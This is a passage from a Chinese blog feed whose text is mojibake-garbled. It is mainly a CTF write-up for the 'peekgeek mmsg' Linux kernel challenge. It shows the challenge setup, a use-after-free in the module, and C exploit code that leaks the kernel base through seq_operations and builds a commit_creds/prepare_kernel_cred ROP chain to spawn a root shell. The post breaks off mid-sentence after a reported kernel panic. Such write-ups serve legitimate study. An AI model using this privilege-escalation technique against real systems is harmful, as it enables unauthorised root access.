title="SafeSEH"></a>SafeSEH</h3><p>å®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå³ç™½åå•å®‰å…¨æ²™ç®±ï¼Œäº‹å…ˆå®šä¹‰ä¸€äº›å¼‚å¸¸å¤„ç†ç¨‹åºï¼Œå¹¶åŸºäºæ­¤æ„é€ å®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†è¡¨ï¼Œç¨‹åºæ­£å¼è¿è¡Œåï¼Œå®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†è¡¨ä¹‹å¤–çš„å¼‚å¸¸å¤„ç†ç¨‹åºå°†ä¼šè¢«é˜»æ­¢è¿è¡Œã€‚</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul><li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/readme/">CTF-wili</a></li><li><a href="https://source.android.google.cn/docs/security/test/cfi?hl=zh-cn">android CFI</a></li><li><a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">Control Flow Integrity â€” Clang</a></li><li><a href="https://www.cnblogs.com/pwnfeifei/p/17162374.html">windows pwn</a></li><li><a href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">Windows_Pwnå­¦ä¹ </a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¨‹åºç¼“è§£æœºåˆ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>peekgeek mmsg</title>
      <link href="/2023/07/28/peekgeek%20mmsg/"/>
      <url>/2023/07/28/peekgeek%20mmsg/</url>
      
        <content type="html"><![CDATA[<blockquote><p>åšé¢˜è¸©å‘å®å½•ï¼Œèµ›åå¤ç°.</p></blockquote><span id="more"></span><h2 id="step1-init"><a href="#step1-init" class="headerlink" title="step1: init"></a>step1: init</h2><ul><li>æ‹¿åˆ°é™„ä»¶ï¼ŒæŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼Œsmep, smap, kaslrï¼Œåº”è¯¥è¿˜æœ‰pti</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu host,+smep,+smap \</span><br><span class="line">        -smp cores=1 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -hda rootfs.img \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor none \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -enable-kvm \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init  quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">        -no-reboot</span><br></pre></td></tr></table></figure><ul><li>ext4 é•œåƒæŒ‚è½½</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"></span><br><span class="line">sudo mount rootfs.img ./rootfs</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹initï¼Œ etc&#x2F;init.d ä¸‹çš„æ–‡ä»¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chmod</span> 700 /root</span><br><span class="line"><span class="built_in">chown</span> -R ctf:ctf /home/ctf</span><br><span class="line"><span class="built_in">chown</span> root:root /root/flag</span><br><span class="line"><span class="built_in">chmod</span> 600 /root/flag</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/kptr_restrict</span></span><br><span class="line"></span><br><span class="line">insmod /root/mmsg.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/mmsg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line"><span class="comment"># setsid cttyhack su ctf -c /bin/sh</span></span><br><span class="line">setsid cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><ul><li>ä¿®æ”¹å†…å®¹ï¼Œå°†koæ–‡ä»¶æ‹·è´ä¸€ä»½ï¼Œetc&#x2F;init.d&#x2F;rcSå†…å®¹ä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶åumountï¼Œå¯åŠ¨ã€‚ï¼ˆä¿®æ”¹æ•ˆæœç”Ÿæ•ˆå¿…é¡»è¦<strong>umount</strong>ï¼‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount ./rootfs</span><br></pre></td></tr></table></figure><ul><li>å†…æ ¸ç‰ˆæœ¬ <code>5.10.186</code></li></ul><h2 id="step2-ko"><a href="#step2-ko" class="headerlink" title="step2: ko"></a>step2: ko</h2><ul><li>é€†å‘åˆ†ækoæ–‡ä»¶ï¼ˆç›´æ¥ç»™å‡ºäº†cæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä¸çœ‹ï¼‰ã€‚æ¼æ´æ‰€åœ¨çš„åœ°æ–¹ï¼Œç±»ä¼¼å…¥é—¨ç»å…¸é¢˜ç›®<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/">kernel UAF - CTF Wiki</a>ã€‚ä½†æ˜¯ç»“æ„ä½“å¤§å°0x20</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> *<span class="title">mmsg_head</span>;</span> </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">mmsg_device</span>;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> &#123;</span><br><span class="line">Â  Â  kfree(mmsg_head);</span><br><span class="line">Â  Â  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mmsg_module_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    mmsg_device.minor = MISC_DYNAMIC_MINOR;</span><br><span class="line">    mmsg_device.name = DEVICE_NAME;</span><br><span class="line">    mmsg_device.fops = &amp;module_fops;</span><br><span class="line">    misc_register(&amp;mmsg_device);</span><br><span class="line">    mmsg_head = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_head), GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strncpy</span>(mmsg_head-&gt;description, DEVICE_NAME <span class="string">&quot;-mmsg_head&quot;</span>, <span class="number">15</span>);</span><br><span class="line">    INIT_LIST_HEAD(&amp;mmsg_head-&gt;<span class="built_in">list</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mmsg_module_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    misc_deregister(&amp;mmsg_device);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li></li></ul><h2 id="step3-exploit"><a href="#step3-exploit" class="headerlink" title="step3: exploit"></a>step3: exploit</h2><ul><li>å°è¯•ROPï¼Œä½†æ˜¯ä¸å¤ªä¼šğŸ¤¡</li></ul><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>åŸæ–‡å†…å®¹ï¼š <a href="https://n.ova.moe/blog/2023/03/18/_%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">ã€ŒPWNã€å†…æ ¸ PWN é¢˜ç›®çš„ç¬¬ä¸€æ¬¡å°è¯•</a></p><ul><li>åƒï¼Œå¾ˆåƒå‘€ã€‚çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°åŠå…¶ç±»ä¼¼ï¼Œäºæ˜¯å°è¯•ä½¿ç”¨ç±»ä¼¼çš„expè¿›è¡Œåš</li><li>è°ƒè¯•ï¼Œæ‰¾åœ°å€ï¼Œå…ˆå…³é—­kaslrï¼Œé€šè¿‡æ³„éœ²è·å¾—offset</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  gcc exp.c -static -o exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd1, fd2;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev_name = <span class="string">&quot;/dev/mmsg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel base =&gt;  cat /proc/kallsyms | grep startup_64</span></span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nokalr kernel base</span></span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cat /sys/module/mmsg/sections/.text</span></span><br><span class="line"><span class="comment"> * 0xffffffffc03f5000</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// close kaslr</span></span><br><span class="line"><span class="comment">// grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="comment">// grep commit_creds  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff9248d350</span>;</span><br><span class="line"><span class="comment">// grep swapgs_restore_regs_and_return_to_usermode  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"><span class="comment">//  grep native_write_cr4 /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> native_write_cr4 = <span class="number">0xffffffffa8832250</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ropper</span></span><br><span class="line"><span class="comment">// pop rdi; ret</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff812274dd</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82d63c0d: mov edi, eax; call rbx;</span></span><br><span class="line"><span class="comment">// åœ¨ 64 ä½ç¯å¢ƒä¸‹ï¼Œç›®çš„å¯„å­˜å™¨è‹¥æ˜¯ 32 ä½ï¼Œåˆ™ä¼šå°†é«˜ 32 ä½æ¸…é›¶</span></span><br><span class="line"><span class="type">size_t</span> mov_edi_eax_call_rbx = <span class="number">0xffffffff82d63c0d</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82e6f708: pop rbx; ret; </span></span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff82e6f708</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">  <span class="type">int</span> top;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">new</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recv_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">put_mmsg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *addr)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  arg.data = addr;</span><br><span class="line">  ioctl(fd, <span class="number">0x5555555</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_mmsg</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  arg.data = (<span class="type">char</span> *)buf;</span><br><span class="line">  ioctl(fd, <span class="number">0x6666666</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line"> <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">asm</span>(</span><br><span class="line">   <span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%rsp, %3;&quot;</span></span><br><span class="line">   <span class="string">&quot;pushfq;&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %2;&quot;</span></span><br><span class="line">   : <span class="string">&quot;=r&quot;</span>(user_cs),<span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_rsp)</span><br><span class="line">   : </span><br><span class="line">      : <span class="string">&quot;memory&quot;</span></span><br><span class="line">   );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;[x] seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">()</span> &#123;</span><br><span class="line">    fd1 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd2 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_base</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// read æ“ä½œï¼Œç»è¿‡å‡½æ•°è°ƒç”¨é“¾åˆ™ä¼šæœ€ç»ˆè°ƒç”¨ seq_operations-&gt;start æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°</span></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line">    get_mmsg(fd2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;buf[%d] =&gt; 0x%llx\n&quot;</span>, j, buf[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base =&gt; 0x%llx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status(); </span><br><span class="line">    uaf();</span><br><span class="line">    leak_base();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>rop</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¹‹å‰çš„éƒ½ä¸€æ ·</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> o(x) (x+kernel_offset)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// smep userspaceåœ°å€è¢«æ ‡è®°ä¸ºnon-executable</span></span><br><span class="line">    <span class="comment">// bypass: stack prviot</span></span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x40</span>];</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> user_rip = (<span class="type">size_t</span>)get_shell;</span><br><span class="line"></span><br><span class="line">    payload[idx++] = o(pop_rbx_ret);</span><br><span class="line">    payload[idx++] = o(commit_creds);</span><br><span class="line">    payload[idx++] = o(pop_rdi_ret); <span class="comment">// return address</span></span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = o(prepare_kernel_cred);</span><br><span class="line">    payload[idx++] = o(mov_edi_eax_call_rbx);</span><br><span class="line">    payload[idx++] = o(swapgs_restore_regs_and_return_to_usermode) + <span class="number">22</span>; </span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = user_rip;</span><br><span class="line">    payload[idx++] = user_cs;</span><br><span class="line">    payload[idx++] = user_rflags;</span><br><span class="line">    payload[idx++] = user_rsp;</span><br><span class="line">    payload[idx++] = user_ss;</span><br><span class="line">    </span><br><span class="line">    put_mmsg(fd2, (<span class="type">char</span> *)&amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger seq_file-&gt;start</span></span><br><span class="line">    read(seq_fd, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>ä½¿ç”¨xchg è¿›è¡Œç±»ä¼¼æ ˆè¿ç§»çš„æ“ä½œï¼Œä»è€Œè¿›è¡ŒåŠ«æŒå‡½æ•°æ‰§è¡Œæµ</p></li><li><p>åœ¨æœ¬åœ°æ‰§è¡Œæ—¶ï¼Œç›´æ¥kernel panicã€‚æŸ¥çœ‹æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°æ˜¯<code>can&#39;t access memory in 0x????(æ˜¯ä¸ªç”¨æˆ·åœ°å€)</code>ã€‚</p></li></ul><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>åæ¥çœ‹æ¥ä¸€ä¸‹è¿™ç¯‡æ–‡ç« å‘ç°åŸå› ï¼š<a 